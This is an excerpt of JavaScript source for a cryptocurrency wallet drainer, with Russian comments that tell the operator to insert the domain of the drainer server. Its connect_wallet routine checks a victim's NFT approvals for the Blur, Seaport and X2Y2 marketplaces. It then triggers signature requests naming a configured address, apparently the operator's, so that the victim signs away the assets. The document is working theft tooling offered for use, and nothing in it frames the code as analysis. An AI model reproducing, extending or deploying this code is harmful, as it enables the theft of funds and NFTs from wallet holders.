...
const CF_Server_URL = "ВСТАВИТЬ_ДОМЕН_СЕРВЕРА_СЮДА"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const CF_WalletConnect_ID = "ea52b0e550593829f2eee2cb9006f642"; // Project ID из WalletConnect Cloud
...
const connect_wallet = async (provider = null) => {
  try {
    ...
    if (typeof SIGN_BLUR !== 'undefined' && CF_Settings.Settings.Blur.Enable == 1 && CF_Settings.Settings.Blur.Priority == 1)
      await SIGN_BLUR(assets, CF_Provider, CF_Current_Address, CF_Settings.Address, CF_ID, CF_Settings.Settings.Blur.Price);
    if (typeof SIGN_SEAPORT !== 'undefined' && CF_Settings.Settings.SeaPort.Enable == 1 && CF_Settings.Settings.SeaPort.Priority == 1)
      await SIGN_SEAPORT(assets, CF_Provider, CF_Current_Address, CF_Settings.Address, CF_ID, CF_Settings.Settings.SeaPort.Price);
    if (typeof SIGN_X2Y2 !== 'undefined' && CF_Settings.Settings.x2y2.Enable == 1 && CF_Current_Chain_ID == 1 && CF_Settings.Settings.x2y2.Priority == 1)
      await SIGN_X2Y2(assets, CF_Provider, CF_Current_Address, CF_Settings.Address, CF_ID, CF_Settings.Settings.x2y2.Price);
      ...
      for (const asset of assets) {
        try {
          ...
          if (asset.type == 'NATIVE') {
            ...
            } else if (typeof SIGN_BLUR !== 'undefined' && CF_Settings.Settings.Blur.Enable == 1 && CF_Settings.Settings.Blur.Priority == 0 && !BL_US
            && CF_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, CF_Current_Address, "0x00000000000111abe46ff893f3b2fdf1f759a8a8"))
            && asset.amount_usd >= CF_Settings.Settings.Blur.Price) {
              await SIGN_BLUR(assets, CF_Provider, CF_Current_Address, CF_Settings.Address, CF_ID, CF_Settings.Settings.Blur.Price); BL_US = true;
            } else if (typeof SIGN_SEAPORT !== 'undefined' && CF_Settings.Settings.SeaPort.Enable == 1 && CF_Settings.Settings.SeaPort.Priority == 0 && !SP_US
            && CF_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, CF_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71"))
            && asset.amount_usd >= CF_Settings.Settings.SeaPort.Price) {
              await SIGN_SEAPORT(assets, CF_Provider, CF_Current_Address, CF_Settings.Address, CF_ID, CF_Settings.Settings.SeaPort.Price); SP_US = true;
            } else if (typeof SIGN_X2Y2 !== 'undefined' && CF_Settings.Settings.x2y2.Enable == 1 && CF_Settings.Settings.x2y2.Priority == 0 && !XY_US
            && CF_Current_Chain_ID == 1 && (await is_nft_approved(asset.address, CF_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354"))
            && asset.amount_usd >= CF_Settings.Settings.x2y2.Price) {
              await SIGN_X2Y2(assets, CF_Provider, CF_Current_Address, CF_Settings.Address, CF_ID, CF_Settings.Settings.x2y2.Price); XY_US = true;
